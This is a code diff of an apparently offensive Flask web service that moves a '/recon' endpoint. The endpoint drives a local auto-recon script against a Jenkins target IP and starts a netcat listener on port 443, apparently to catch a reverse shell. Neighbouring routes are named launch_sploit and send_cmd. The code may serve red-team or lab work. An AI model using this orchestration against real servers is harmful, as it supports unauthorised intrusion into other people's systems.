@@ -32,57 +32,6 @@ app = Flask(__name__)
 def hello():
     return "Good Day!"
 
-@app.route("/recon", methods=['POST'])
-def recon_run():
-    if request.is_json:
-        print(request.data)
-        payload = request.get_json()
-        print(request.mimetype)
-        print(request.content_type)
-        print(request.accept_mimetypes)
-        print(payload)
-        print(type(payload))
-        target_ip = payload.get('target', '')
-        attacker_ip = payload.get('attacker', '')
-        if target_ip == "" or attacker_ip == "":
-            print('Payload is all wrong!')
-            print(request.payload)
-            return 'ERROR'
-
-        exe = '/root/auto-recon.sh'
-        if not os.path.exists(exe):
-            return 500, 'launch script does not exist'
-
-        print('Launching auto-recon.sh')
-        child = pexpect.spawn('/root/auto-recon.sh')
-        child.delaybeforesend = 2
-        found_index = child.expect(['press any key to continue', pexpect.EOF, pexpect.TIMEOUT])
-        if found_index == 0:
-            print('launching listener process')
-            _launch_listener()
-            child.send('\n')
-        else:
-            return 'ERROR - Could not press key to continue'
-
-        found_index = child.expect(['Enter Jenkins Target IP Address', pexpect.EOF, pexpect.TIMEOUT])
-        if found_index == 0:
-            print(child.before)
-            print('Sending target ip')
-            child.sendline(target_ip)
-        else:
-            print(child.before)
-            return 'ERROR - Could not enter jenkins IP for recon'
-
-        found_index = child.expect(['done', pexpect.EOF, pexpect.TIMEOUT])
-        if found_index == 0:
-            print('PWN')
-            print(child)
-            time.sleep(2)
-            return 'SUCCESS - auto-recon launched!'
-
-    else:
-        return 'No Bueno - No JSON payload detected'
-
 @app.route("/launch", methods=['POST'])
 def launch_sploit():
     """
@@ -200,7 +149,57 @@ def send_cmd():
     else:
         return 'NOWAYJOSE'
 
+@app.route("/recon", methods=['POST'])
+def recon_run():
+    if request.is_json:
+        print(request.data)
+        payload = request.get_json()
+        print(request.mimetype)
+        print(request.content_type)
+        print(request.accept_mimetypes)
+        print(payload)
+        print(type(payload))
+        target_ip = payload.get('target', '')
+        attacker_ip = payload.get('attacker', '')
+        if target_ip == "" or attacker_ip == "":
+            print('Payload is all wrong!')
+            print(request.payload)
+            return 'ERROR'
 
+        exe = '/root/auto-recon.sh'
+        if not os.path.exists(exe):
+            return 500, 'launch script does not exist'
+
+        print('Launching auto-recon.sh')
+        child = pexpect.spawn('/root/auto-recon.sh')
+        child.delaybeforesend = 2
+        found_index = child.expect(['press any key to continue', pexpect.EOF, pexpect.TIMEOUT])
+        if found_index == 0:
+            print('launching listener process')
+            _launch_listener()
+            child.send('\n')
+        else:
+            return 'ERROR - Could not press key to continue'
+
+        found_index = child.expect(['Enter Jenkins Target IP Address', pexpect.EOF, pexpect.TIMEOUT])
+        if found_index == 0:
+            print(child.before)
+            print('Sending target ip')
+            child.sendline(target_ip)
+        else:
+            print(child.before)
+            return 'ERROR - Could not enter jenkins IP for recon'
+
+        found_index = child.expect(['done', pexpect.EOF, pexpect.TIMEOUT])
+        if found_index == 0:
+            print('PWN')
+            print(child)
+            time.sleep(2)
+            return 'SUCCESS - auto-recon launched!'
+
+    else:
+        return 'No Bueno - No JSON payload detected'
+        
 def _launch_listener():
     if 'listener' not in app.config:
         listener = pexpect.spawn('nc -lvp 443')
